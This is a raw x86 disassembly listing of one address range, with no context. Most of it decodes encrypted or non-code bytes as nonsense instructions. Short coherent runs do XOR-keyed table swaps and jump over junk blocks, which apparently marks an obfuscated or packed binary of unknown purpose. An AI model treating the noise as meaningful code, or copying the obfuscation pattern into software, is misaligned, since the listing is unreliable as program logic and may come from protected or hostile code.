  4049a1:	dec    esp
  4049a2:	adc    al,0xe3
  4049a4:	(bad)  
  4049a6:	test   BYTE PTR [edx],0x84
  4049a9:	fsubr  DWORD PTR [edi*1-0xbfbb0c]
  4049b0:	adc    al,0x4e
  4049b2:	fist   WORD PTR [ebx+0x10489d87]
  4049b8:	repz jns 0x4049b7
  4049bb:	add    BYTE PTR [edx],0x3
  4049be:	mov    ch,0xcc
  4049c0:	aad    0xdb
  4049c2:	repnz loop 0x4049c0
  4049c5:	push   ds
  4049c6:	jg     0x4049e7
  4049c8:	sub    eax,0xe45ed247
  4049cd:	mov    eax,ds:0xef653af4
  4049d2:	ja     0x404a3d
  4049d4:	es xor al,0xac
  4049d7:	or     cl,dl
  4049d9:	repz icebp 
  4049db:	dec    eax
  4049dc:	pop    esi
  4049dd:	sub    al,0x66
  4049df:	fs sub al,0x79
  4049e2:	lods   eax,DWORD PTR ds:[esi]
  4049e3:	dec    esp
  4049e4:	mov    WORD PTR [ebx],?
  4049e6:	cmp    ah,BYTE PTR cs:[ecx]
  4049e9:	loopne 0x4049c3
  4049eb:	jo     0x404a35
  4049ed:	xor    eax,0x289f7564
  4049f2:	scas   eax,DWORD PTR es:[edi]
  4049f3:	lods   al,BYTE PTR ds:[esi]
  4049f4:	out    dx,al
  4049f5:	dec    esi
  4049f6:	sub    BYTE PTR [esi],ah
  4049f8:	inc    edx
  4049f9:	sbb    DWORD PTR [eax-0x25],edi
  4049fc:	xor    esi,DWORD PTR [ebx+0x4ebdff1a]
  404a02:	jg     0x4049c9
  404a04:	add    al,0xc4
  404a06:	test   eax,0x592dce3d
  404a0b:	add    DWORD PTR [edx-0x35bad7c0],edx
  404a11:	xchg   esi,eax
  404a12:	gs in  al,0x21
  404a15:	int3   
  404a16:	sbb    DWORD PTR [edi-0x2e],ebx
  404a19:	sbb    BYTE PTR [esi-0x38aa1b1],bh
  404a1f:	xor    BYTE PTR [eax-0x4b28d4c0],bh
  404a25:	sbb    ah,ch
  404a27:	scas   al,BYTE PTR es:[edi]
  404a28:	mov    dh,0x5f
  404a2a:	sbb    ebx,DWORD PTR [ebx-0x57c4608c]
  404a30:	add    edx,ecx
  404a32:	xchg   ebp,eax
  404a33:	retf   
  404a34:	fnsave [edx+ebx*2]
  404a37:	scas   al,BYTE PTR es:[edi]
  404a38:	in     al,dx
  404a39:	stos   DWORD PTR es:[edi],eax
  404a3a:	out    0x4d,eax
  404a3c:	mov    ds:0x16b18c59,al
  404a41:	jns    0x404a78
  404a43:	jno    0x404a5b
  404a45:	push   ss
  404a46:	adc    al,0xc0
  404a48:	out    0xae,eax
  404a4a:	cmp    al,0xdc
  404a4c:	or     DWORD PTR [ebp+0x59],eax
  404a4f:	sub    DWORD PTR es:[esi],esi
  404a52:	sahf   
  404a53:	les    esi,FWORD PTR [edi]
  404a55:	sub    edx,esi
  404a57:	arpl   WORD PTR [edx+0x2c],ax
  404a5a:	das    
  404a5b:	cmp    bl,BYTE PTR [ebp+0x66]
  404a5e:	or     al,0x89
  404a60:	sub    eax,0xe5aada2c
  404a65:	or     BYTE PTR [ebp+0x1a],dh
  404a68:	cli    
  404a69:	mov    dh,0x15
  404a6b:	out    0x3b,eax
  404a6d:	mov    bl,al
  404a6f:	mov    BYTE PTR [edx-0x16b6a019],dh
  404a75:	bound  edi,QWORD PTR ds:0xbddc8d89
  404a7b:	dec    edx
  404a7c:	dec    edx
  404a7d:	jmp    0x85acc60b
  404a82:	idiv   DWORD PTR [ecx-0x76]
  404a85:	and    cl,BYTE PTR [edx-0x4f]
  404a88:	lea    ebx,[ecx]
  404a8a:	(bad)  
  404a8b:	out    0xb1,eax
  404a8d:	cli    
  404a8e:	mov    gs:0x65f0a9e2,al
  404a94:	out    0xde,al
  404a96:	push   edx
  404a97:	pop    esi
  404a98:	pushf  
  404a99:	mov    ds:0xd36e2e65,al
  404a9e:	iret   
  404a9f:	add    ebx,DWORD PTR [edx-0x55640731]
  404aa5:	int3   
  404aa6:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  404aad:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  404ab4:	mov    edx,DWORD PTR [ebp-0x18]
  404ab7:	xor    edx,eax
  404ab9:	add    edx,ecx
  404abb:	jmp    0x404e2b
  404ac0:	mov    edx,DWORD PTR [ebp-0x18]
  404ac3:	xor    edx,eax
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0x453c6a28
  404b32:	inc    edi
  404b33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b34:	mov    fs:0x587e7e22,al
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404b0b
  404b3e:	ret    
  404b3f:	adc    DWORD PTR [esi],edx
  404b41:	push   esp
  404b42:	call   0xf6d2d572
  404b47:	dec    ecx
  404b48:	jbe    0x404b03
  404b4a:	loop   0x404b3c
  404b4c:	or     esp,ecx
  404b4e:	daa    
  404b4f:	sar    DWORD PTR [esi],cl
  404b51:	ins    BYTE PTR es:[edi],dx
  404b52:	js     0x404b24
  404b54:	pop    edi
  404b55:	jo     0x404b78
  404b57:	fstp   QWORD PTR [eax+eiz*4]
  404b5a:	fsub   QWORD PTR [eax]
  404b5c:	(bad)  
  404b5d:	jg     0x404b0f
  404b5f:	sbb    DWORD PTR [ebx],edi
  404b61:	xor    BYTE PTR [edi],bl
  404b63:	jbe    0x404bd4
  404b65:	test   eax,0xc03c6175
  404b6a:	fs xchg edi,eax
  404b6c:	add    esi,DWORD PTR [ebx+0x5f]
  404b6f:	int3   
  404b70:	xchg   ebx,eax
  404b71:	ja     0x404b6a
  404b73:	and    eax,0xd75f8282
  404b78:	aad    0x98
  404b7a:	popa   
  404b7b:	push   es
  404b7c:	lds    ebp,FWORD PTR [esi]
  404b7e:	sbb    al,BYTE PTR [ebx]
  404b80:	cld    
  404b81:	mov    dh,0x93
  404b83:	mov    ebp,0xb5a54857
  404b88:	(bad)  
  404b89:	sbb    dh,ch
  404b8b:	sub    al,0x7
  404b8d:	sbb    ch,BYTE PTR [esi+edi*8+0x54]
  404b91:	cmp    al,BYTE PTR [edi+0x58]
  404b94:	jnp    0x404bab
  404b96:	dec    eax
  404b97:	inc    DWORD PTR [ecx]
  404b99:	xlat   BYTE PTR ds:[ebx]
  404b9a:	outs   dx,BYTE PTR ds:[esi]
  404b9b:	mov    bl,0x43
  404b9d:	push   ebp
  404b9e:	ins    DWORD PTR es:[edi],dx
  404b9f:	aaa    
  404ba0:	push   0xc79e939b
  404ba5:	pop    eax
  404ba6:	xchg   esp,eax
  404ba7:	or     ch,BYTE PTR ds:0x79761ce
  404bad:	vminss xmm7,xmm2,xmm4
  404bb1:	mov    ecx,0x497a15e3
  404bb6:	add    edx,DWORD PTR [esp+ebp*1]
  404bb9:	sahf   
  404bba:	outs   dx,BYTE PTR ds:[esi]
  404bbb:	jne    0x404c27
  404bbd:	inc    edx
  404bbe:	clc    
  404bbf:	mov    al,BYTE PTR [bp+di-0xc]
  404bc3:	xchg   edi,eax
  404bc4:	push   0xdb0c44d1
  404bc9:	inc    eax
  404bca:	jae    0x404b98
  404bcc:	and    BYTE PTR [ebx],dh
  404bce:	scas   al,BYTE PTR es:[edi]
  404bcf:	test   DWORD PTR [eax-0x109b3488],esi
  404bd5:	mov    edx,0x95523ff1
  404bda:	mov    bl,0x45
  404bdc:	loopne 0x404c23
  404bde:	ins    DWORD PTR es:[edi],dx
  404bdf:	sub    edi,esi
  404be1:	xchg   ebx,eax
  404be2:	cld    
  404be3:	bound  ebx,QWORD PTR [edx+eax*2]
  404be6:	leave  
  404be7:	inc    edi
  404be8:	inc    esp
  404be9:	fldenv [esi+0x6f90073f]
  404bef:	mov    dl,0x5
  404bf1:	pushf  
  404bf2:	pop    esp
  404bf3:	into   
  404bf4:	std    
  404bf5:	pop    ebp
  404bf6:	sbb    al,0x67
  404bf8:	push   0xffffff8d
  404bfa:	sub    al,0xb5
  404bfc:	bound  ecx,QWORD PTR [edi-0x11]
  404bff:	cmp    BYTE PTR [edi],dh
  404c01:	xchg   edx,eax
  404c02:	push   ebx
  404c03:	add    bl,dh
  404c05:	ins    DWORD PTR es:[edi],dx
  404c06:	inc    edx
  404c07:	or     eax,0xcb6c341e
  404c0c:	add    eax,0xf080ab27
  404c11:	pop    ss
  404c12:	fucomip st,st(0)
  404c14:	mov    ch,0x79
  404c16:	pop    ebx
  404c17:	push   0x32
  404c19:	mov    al,BYTE PTR [esi-0x39]
  404c1c:	popf   
  404c1d:	repnz div DWORD PTR [ecx-0x161dad06]
  404c24:	dec    ecx
  404c25:	pop    ss
  404c26:	mov    edi,0x705b2c34
  404c2b:	out    0xe0,al
  404c2d:	hlt    
  404c2e:	repz or eax,0x122ea6ba
  404c34:	out    dx,al
  404c35:	adc    ah,BYTE PTR [eax]
  404c37:	sub    eax,0xce13154e
  404c3c:	cdq    
  404c3d:	shl    BYTE PTR [ecx+eiz*8+0x4a],0x5b
  404c42:	stos   BYTE PTR es:[edi],al
  404c43:	dec    esi
  404c44:	rep ins BYTE PTR es:[edi],dx
  404c46:	cld    
  404c47:	loope  0x404be1
  404c49:	dec    esi
  404c4a:	mov    ebp,0x4910a81c
  404c4f:	ins    DWORD PTR es:[edi],dx
  404c50:	xchg   ebx,ebp
  404c52:	out    0x39,eax
  404c54:	ret    0x4e1e
  404c57:	push   esp
  404c58:	sbb    DWORD PTR [edx+0x10e71db9],edi
  404c5e:	jae    0x404c2e
  404c60:	add    DWORD PTR [edx],esp
  404c62:	cmp    DWORD PTR [ebp+eiz*2-0x7bfa4d82],0x35e3ca69
  404c6d:	call   0x51ee:0x6e0690a2
  404c74:	fistp  DWORD PTR ds:[ecx+0x45010794]
  404c7b:	add    BYTE PTR [esi+0x65],0x57
  404c7f:	mov    edi,0xbe75f685
  404c84:	xor    bl,BYTE PTR [edx-0x1a717c2d]
  404c8a:	adc    al,0x4
  404c8c:	push   ds
  404c8d:	mov    WORD PTR [esi-0x75e9bca3],ds
  404c93:	jno    0x404cae
  404c95:	loop   0x404c2f
  404c97:	dec    esp
  404c98:	and    BYTE PTR [ebx],al
  404c9a:	fs xor dh,bl
  404c9d:	adc    eax,0x5a6db775
  404ca2:	std    
  404ca3:	shr    DWORD PTR [edx],cl
  404ca5:	mov    BYTE PTR [edi+esi*8-0x2d],dl
  404ca9:	daa    
  404caa:	add    BYTE PTR [eax+0x45],0x76
  404cae:	faddp  st(0),st
  404cb0:	or     al,0xf0
  404cb2:	in     al,0xd2
  404cb4:	gs in  al,dx
  404cb6:	ins    BYTE PTR es:[edi],dx
  404cb7:	(bad)  
  404cb8:	adc    ecx,DWORD PTR [esi+0xb3574bb]
  404cbe:	push   ebx
  404cbf:	ins    DWORD PTR es:[edi],dx
  404cc0:	mov    dl,0x7e
  404cc2:	dec    esp
  404cc3:	push   edx
  404cc4:	in     al,0xca
  404cc6:	pop    eax
  404cc7:	jne    0x404caf
  404cc9:	stc    
  404cca:	add    ah,ah
  404ccc:	mov    edx,0x76a31426
  404cd1:	dec    edi
  404cd2:	loopne 0x404d3a
  404cd4:	loope  0x404d21
  404cd6:	pusha  
  404cd7:	cmp    al,BYTE PTR [ecx-0x77]
  404cda:	enter  0x95cb,0xe4
  404cde:	or     BYTE PTR [ecx+0x117aa1d6],dl
  404ce4:	call   0xd20e5229
  404ce9:	scas   eax,DWORD PTR es:[edi]
  404cea:	out    dx,eax
  404ceb:	ds out dx,al
  404ced:	(bad)  
  404cee:	and    bh,dl
  404cf0:	popf   
  404cf1:	add    al,0xeb
  404cf3:	push   esp
  404cf4:	shr    ch,1
  404cf6:	or     bl,cl
  404cf8:	mov    edx,0xe7adea79
  404cfd:	or     BYTE PTR [edx-0x16],bl
  404d00:	jns    0x404d7c
  404d02:	fimul  DWORD PTR [edi]
  404d04:	pop    esi
  404d05:	in     al,0x9
  404d07:	scas   al,BYTE PTR es:[edi]
  404d08:	xchg   edx,eax
  404d09:	push   edx
  404d0a:	lock imul ebx,DWORD PTR [edx],0x40
  404d0e:	or     DWORD PTR [edx+ebp*8],esp
  404d11:	stos   BYTE PTR es:[edi],al
  404d12:	clc    
  404d13:	shl    ah,cl
  404d15:	push   eax
  404d16:	xor    BYTE PTR [ecx+eax*8-0x34],dl
  404d1a:	cmp    bl,BYTE PTR [ebp-0x6359a65]
  404d20:	outs   dx,BYTE PTR ds:[esi]
  404d21:	fwait
  404d22:	retf   
  404d23:	adc    al,BYTE PTR [esi-0x67]
  404d26:	in     al,dx
  404d27:	rol    BYTE PTR [esi+0x48d5e3b8],cl
  404d2d:	dec    ebx
  404d2e:	push   ebp
  404d2f:	or     eax,0x78f36d38
  404d34:	fs scas eax,DWORD PTR es:[edi]
  404d36:	outs   dx,BYTE PTR ds:[esi]
  404d37:	sub    al,0xfe
  404d39:	int    0xb5
  404d3b:	mov    eax,es:0x1e1ccaa0
  404d41:	sub    eax,0xd5a7651d
  404d46:	adc    BYTE PTR [ecx-0x7f],cl
  404d49:	push   eax
  404d4a:	lock call 0x170e776a
  404d50:	mov    ecx,DWORD PTR [ebx-0x52c268]
  404d56:	cmp    BYTE PTR [edi-0x64],0x54
  404d5a:	pop    ds
  404d5b:	inc    edx
  404d5c:	add    BYTE PTR [edi+0xc],ah
  404d5f:	xchg   esi,eax
  404d60:	jle    0x404cee
  404d62:	mov    es,edx
  404d64:	sub    bh,BYTE PTR [esi]
  404d66:	sar    al,0x5d
  404d69:	hlt    
  404d6a:	jg     0x404d3d
  404d6c:	mov    edx,0x4b379022
  404d71:	pop    esi
  404d72:	aam    0xff
  404d74:	jae    0x404d03
  404d76:	xor    DWORD PTR [ecx+0x7a006f22],esi
  404d7c:	sti    
  404d7d:	jne    0x404d87
  404d7f:	fs test eax,0x51b8cfb7
  404d85:	scas   eax,DWORD PTR es:[edi]
  404d86:	aad    0x4
  404d88:	xchg   cx,ax
  404d8a:	lock in eax,0x7e
  404d8d:	(bad)  
  404d8e:	mov    esi,0xcee1fdb0
  404d93:	(bad)  
  404d94:	stc    
  404d95:	test   DWORD PTR [ebp+edx*1+0xe],0x1c82665c
  404d9d:	cmp    ebx,DWORD PTR [edi+edi*8+0x13]
  404da1:	retf   0x2754
  404da4:	push   cs
  404da5:	fsub   DWORD PTR [ebx-0x4e]
  404da8:	and    ebx,esp
  404daa:	xchg   esp,eax
  404dab:	(bad)  
  404dac:	xor    DWORD PTR ds:0xfcf9f293,ecx
  404db2:	mov    esp,edx
  404db4:	and    eax,DWORD PTR [edx+0x26d42a4b]
  404dba:	xchg   ebx,eax
  404dbb:	out    0x53,al
  404dbd:	mov    edx,DWORD PTR [ecx-0x11]
  404dc0:	cs js  0x404e20
  404dc3:	pop    ss
  404dc4:	push   ebx
  404dc5:	pushf  
  404dc6:	add    al,0x2b
  404dc8:	aad    0x3c
  404dca:	mov    ds:0xa0ca735c,al
  404dcf:	jmp    0x404da6
  404dd1:	nop
  404dd2:	fs cmp bl,dl
  404dd5:	add    eax,0xb72d31e4
  404dda:	test   DWORD PTR ds:0x9b0bee1f,0x60bb8ed9
  404de4:	jmp    0x404dec
  404de6:	inc    esp
  404de7:	and    bh,BYTE PTR [ebp+0x5a]
  404dea:	jecxz  0x404e4d
  404dec:	cmp    dl,BYTE PTR [eax+0x2d]
  404def:	hlt    
  404df0:	rcr    DWORD PTR [esi-0x69],cl
  404df3:	dec    esi
  404df4:	int    0xe5
  404df6:	pop    ss
  404df7:	gs pop edi
  404df9:	adc    eax,DWORD PTR [edx]
  404dfb:	pop    ebx
  404dfc:	outs   dx,DWORD PTR ds:[esi]
  404dfd:	rcr    BYTE PTR [ebp+0x49],0xb4
  404e01:	gs stos BYTE PTR es:[edi],al
  404e03:	enter  0xa3b5,0x66
  404e07:	and    BYTE PTR [ebp+0x1d82594d],0x22
  404e0e:	jb     0x404e37
  404e10:	leave  
  404e11:	aaa    
  404e12:	cmp    al,0xec
  404e14:	mov    ds:0xc7ef2940,eax
  404e19:	push   esi
  404e1a:	call   DWORD PTR [ebx+0x4a9cac92]
  404e20:	pop    edi
  404e21:	jo     0x404e75
  404e23:	add    edi,ecx
  404e25:	imul   edx,edi
  404e28:	add    edx,DWORD PTR [ebp-0x14]
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404eb3
  404e5e:	loope  0x404df0
  404e60:	sbb    ecx,DWORD PTR [ecx+eiz*1+0x7c587e7e]
  404e67:	jle    0x404ee7
  404e69:	nop
  404e6a:	hlt    
  404e6b:	test   al,0xba
  404e6d:	push   eax
  404e6e:	mov    edx,0xc485ca4b
  404e73:	aad    0xdb
  404e75:	mov    al,ds:0x40b2baf4
  404e7a:	jne    0x404e16
  404e7c:	sahf   
  404e7d:	pushw  ds
  404e7f:	and    eax,edx
  404e81:	mov    dl,0x2a
  404e83:	out    0x7,al
  404e85:	xlat   BYTE PTR ds:[ebx]
  404e86:	add    BYTE PTR [esi-0x1a],cl
  404e89:	rol    ch,cl
  404e8b:	imul   eax,DWORD PTR [esi],0xa5f80f23
  404e91:	int    0x33
  404e93:	push   ss
  404e94:	xlat   BYTE PTR ds:[ebx]
  404e95:	jle    0x404e62
  404e97:	and    ecx,DWORD PTR [ebp-0x6c628ad3]
  404e9d:	xchg   BYTE PTR [esi-0x1b],cl
  404ea0:	mov    dl,0x39
  404ea2:	nop
  404ea3:	rol    DWORD PTR [esi-0x1e7621de],0x23
  404eaa:	jmp    0x404e9e
  404eac:	pop    ecx
  404ead:	or     dl,BYTE PTR [esi+0x63a44ecf]
  404eb3:	dec    esi
  404eb4:	xchg   ecx,eax
  404eb5:	repz cmp al,0xc7
  404eb8:	mov    al,0x49
  404eba:	xchg   edi,eax
  404ebb:	pop    edi
  404ebc:	pop    ss
  404ebd:	in     eax,dx
  404ebe:	rcr    BYTE PTR gs:[ebx],0x48
  404ec2:	or     dh,dl
  404ec4:	jbe    0x404e4a
  404ec6:	mov    dl,0x2e
  404ec8:	mov    eax,0x55bbe4ef
  404ecd:	ja     0x404e5d
  404ecf:	jmp    0x404e9f
  404ed1:	lods   eax,DWORD PTR ds:[esi]
  404ed2:	cmovb  edx,eax
  404ed5:	jo     0x404e86
  404ed7:	jecxz  0x404efd
  404ed9:	call   0xc9ac2517
  404ede:	test   BYTE PTR [ebx],cl
  404ee0:	daa    
  404ee1:	add    al,0x9
  404ee3:	mov    bl,0x24
  404ee5:	pop    ebp
  404ee6:	lahf   
  404ee7:	sbb    eax,esi
  404ee9:	xchg   DWORD PTR [edx-0x33],ebx
  404eec:	or     eax,0x516458d6
  404ef1:	scas   al,BYTE PTR es:[edi]
  404ef2:	jmp    0x404ed8
  404ef4:	jg     0x404ed2
  404ef6:	push   ecx
  404ef7:	call   0x56e1:0x48794397
  404efe:	aam    0x2e
  404f00:	push   edi
  404f01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f02:	push   DWORD PTR [ebx-0x26]
  404f05:	sar    DWORD PTR [edx],cl
  404f07:	xor    ch,BYTE PTR [ebx-0x26]
  404f0a:	pop    ss
  404f0b:	shr    BYTE PTR [ecx+0x6aa0d8b6],cl
  404f11:	sub    eax,0xe8bf45de
  404f16:	inc    ebx
  404f17:	jae    0x404f32
  404f19:	inc    eax
  404f1a:	mov    eax,ds:0x9e3baa6d
  404f1f:	test   esi,esi
  404f21:	mov    edx,0xccd2778c
  404f26:	(bad)  
  404f27:	adc    ebp,DWORD PTR [edx+0x2b59bfb6]
  404f2d:	push   0xffffffe6
  404f2f:	xchg   esi,eax
  404f30:	pusha  
  404f31:	enter  0xfa71,0x17
  404f35:	scas   eax,DWORD PTR es:[edi]
  404f36:	or     bl,BYTE PTR [esp+ebx*2+0x4fe6dc9]
  404f3d:	mov    ecx,0x9428b2aa
  404f42:	add    ecx,esp
  404f44:	push   edi
  404f45:	popf   
  404f46:	dec    edi
  404f47:	pop    ecx
  404f48:	sbb    eax,0xe17d3e37
  404f4d:	push   esi
  404f4e:	xchg   esp,eax
  404f4f:	xor    al,BYTE PTR ds:0x565082dd
  404f55:	icebp  
  404f56:	mov    edx,0x79c08f98
  404f5b:	(bad)  
  404f5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f5d:	in     eax,0xd9
  404f5f:	data16 daa 
  404f61:	push   es
  404f62:	xlat   BYTE PTR ds:[ebx]
  404f63:	(bad)  
  404f64:	cdq    
  404f65:	retf   0x9a6b
  404f68:	outs   dx,DWORD PTR ds:[esi]
  404f69:	adc    DWORD PTR [ebx-0x8adaed7],edi
  404f6f:	push   cs
  404f70:	aad    0x6d
  404f72:	pop    esp
  404f73:	pop    edx
  404f74:	mov    es,WORD PTR [esi-0x6f]
  404f77:	and    BYTE PTR ds:0x6f2dbf22,al
  404f7d:	mov    cl,0xe6
  404f7f:	outs   dx,BYTE PTR ds:[esi]
  404f80:	lahf   
  404f81:	std    
  404f82:	xchg   ebx,eax
  404f83:	inc    esp
  404f84:	pop    ss
  404f85:	clc    
  404f86:	jecxz  0x404f5b
  404f88:	outs   dx,DWORD PTR ds:[esi]
  404f89:	ss popa 
  404f8b:	inc    esi
  404f8c:	xchg   BYTE PTR [ebp+0x6e5f58e8],bh
  404f92:	dec    edi
  404f93:	jnp    0x404f2b
  404f95:	repz (bad) 
  404f97:	push   0xfffffff5
  404f99:	cmp    BYTE PTR [edx-0x15c57536],dh
  404f9f:	pop    es
  404fa0:	je     0x405019
  404fa2:	daa    
  404fa3:	cwde   
  404fa4:	or     al,0x1c
  404fa6:	mov    BYTE PTR [eax],cl
  404fa8:	push   edi
  404fa9:	retf   0x48e7
  404fac:	out    0xbb,eax
  404fae:	leave  
  404faf:	or     al,0x14
  404fb1:	pusha  
  404fb2:	push   edx
  404fb3:	inc    ebp
  404fb4:	sti    
  404fb5:	imul   edx,DWORD PTR [edi+0x5d],0xa80c2272
  404fbc:	rol    BYTE PTR [ebp-0x33],0x37
  404fc0:	sti    
  404fc1:	add    eax,0x57fabb19
  404fc6:	or     DWORD PTR [eax],esp
  404fc8:	in     al,0xe2
  404fca:	pop    edx
  404fcb:	stos   DWORD PTR es:[edi],eax
  404fcc:	mov    al,0xae
  404fce:	fimul  WORD PTR [edi+0x56]
  404fd1:	fdiv   DWORD PTR [ebp-0x67]
  404fd4:	repz repnz and dl,BYTE PTR [ecx-0x2a]
  404fd9:	dec    ecx
  404fda:	add    eax,DWORD PTR [edi+ecx*1]
  404fdd:	xor    BYTE PTR [ecx],bh
  404fdf:	shl    bl,1
  404fe1:	or     BYTE PTR [ebx],bh
  404fe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fe4:	sar    DWORD PTR [ebx+edx*2],0x48
  404fe8:	ja     0x40505a
  404fea:	push   ebx
  404feb:	mov    ch,0xca
  404fed:	jmp    0x404fa4
  404fef:	sub    BYTE PTR ds:0xeed3972d,ah
  404ff5:	cmp    BYTE PTR [eax],ah
  404ff7:	aad    0x3f
  404ff9:	xchg   esi,edx
  404ffb:	and    bl,BYTE PTR [edi]
  404ffd:	push   0xffffffea
  404fff:	push   cs
  405000:	push   ss
  405001:	mov    ebp,0x72859ab1
  405006:	out    0x7a,eax
  405008:	mov    cl,0xb
  40500a:	sahf   
  40500b:	popa   
  40500c:	inc    edi
  40500d:	mov    eax,0xe797b1ba
  405012:	addr16 jb 0x405038
  405015:	stos   DWORD PTR es:[edi],eax
  405016:	stos   BYTE PTR es:[edi],al
  405017:	clc    
  405018:	nop
  405019:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40501a:	mov    eax,0x5595e3a6
  40501f:	dec    ebx
  405020:	mov    al,ds:0xcd91ad93
  405025:	xchg   esi,eax
  405026:	xlat   BYTE PTR ds:[ebx]
  405027:	iret   
  405028:	pop    edi
  405029:	mov    ah,0x48
  40502b:	lea    ebp,[esi-0x15]
  40502e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405030:	mov    ah,0x19
  405032:	and    DWORD PTR [edx-0x17],esi
  405035:	fwait
  405036:	pop    ss
  405037:	repz stc 
  405039:	push   ecx
  40503a:	dec    ebx
  40503b:	xchg   ebp,eax
  40503c:	sbb    esp,DWORD PTR [eax-0x5e2db598]
  405042:	bound  ebp,QWORD PTR [edx+0x55828a34]
  405048:	jns    0x405002
  40504a:	in     eax,0x8c
  40504c:	and    ch,al
  40504e:	mov    gs,ebx
  405050:	leave  
  405051:	test   esp,edx
  405053:	inc    edi
  405054:	test   BYTE PTR [ebx-0x1c],dl
  405057:	sub    al,0xb1
  405059:	and    DWORD PTR [eax+ebx*8-0x32520094],ecx
  405060:	adc    DWORD PTR [eax],0x2
  405063:	(bad)  
  405064:	push   edi
  405065:	in     al,dx
  405066:	xlat   BYTE PTR ds:[ebx]
  405067:	adc    esi,edi
  405069:	loope  0x404ffb
  40506b:	dec    esi
  40506c:	fstp   TBYTE PTR [edi-0x68f0b130]
  405072:	pop    eax
  405073:	out    dx,eax
  405074:	int3   
  405075:	and    BYTE PTR [eax+0x45],bl
  405078:	xor    DWORD PTR [ebx],esp
  40507a:	call   0x87b9ff5
  40507f:	aaa    
  405080:	inc    esi
  405081:	add    esi,DWORD PTR [edi-0x7f]
  405084:	push   ebx
  405085:	test   al,0xbf
  405087:	cmp    al,0x2b
  405089:	std    
  40508a:	scas   eax,DWORD PTR es:[edi]
  40508b:	arpl   WORD PTR [edi],di
  40508d:	mov    ebp,0x9ee8ef6e
  405092:	push   ds
  405093:	sbb    DWORD PTR [ebp+0x6e],0x6e0f2c30
  40509a:	(bad)  
  40509b:	mov    al,ds:0xc34b6643
  4050a0:	(bad)  
  4050a2:	js     0x4050aa
  4050a4:	repnz out dx,eax
  4050a6:	mov    ecx,0xfda304f8
  4050ab:	fldl2t 
  4050ad:	pop    ds
  4050ae:	and    esi,esp
  4050b0:	in     al,0x24
  4050b2:	xchg   ebx,eax
  4050b3:	xchg   ebp,eax
  4050b4:	cmp    ah,dl
  4050b6:	or     DWORD PTR [edx-0x4451ad8d],esp
  4050bc:	jne    0x4050c8
  4050be:	call   0xc2f4:0x1f93189b
  4050c5:	add    ah,BYTE PTR [eax+0x6b]
  4050c8:	pop    ss
  4050c9:	xor    DWORD PTR es:[ecx],0x322e60ee
  4050d0:	enter  0x1dfe,0xff
  4050d4:	cdq    
  4050d5:	inc    edi
  4050d6:	loop   0x40505a
  4050d8:	add    DWORD PTR ds:0xa4ff3725,edi
  4050de:	cmc    
  4050df:	popa   
  4050e0:	mov    ebp,0xf8b5ec2
  4050e5:	cmp    BYTE PTR [edx-0x3c99feea],cl
  4050eb:	lods   al,BYTE PTR ds:[esi]
  4050ec:	xchg   esp,esi
  4050ee:	imul   edx,DWORD PTR [edi+0x2f22ead2],0xd11d198f
  4050f8:	push   edi
  4050f9:	mov    ebx,0x21c0d771
  4050fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050ff:	mov    al,0xdb
  405101:	pop    esi
  405102:	sub    bl,BYTE PTR [bx-0x1802]
  405107:	repnz sbb BYTE PTR [eax+0x2a3d9f0e],0x2e
  40510f:	pop    esp
  405110:	stc    
  405111:	fimul  WORD PTR gs:[esi+0x22]
  405115:	adc    eax,0xfe662cde
  40511a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40511b:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40511d:	stos   DWORD PTR es:[edi],eax
  40511e:	adc    DWORD PTR [edi+0x36],eax
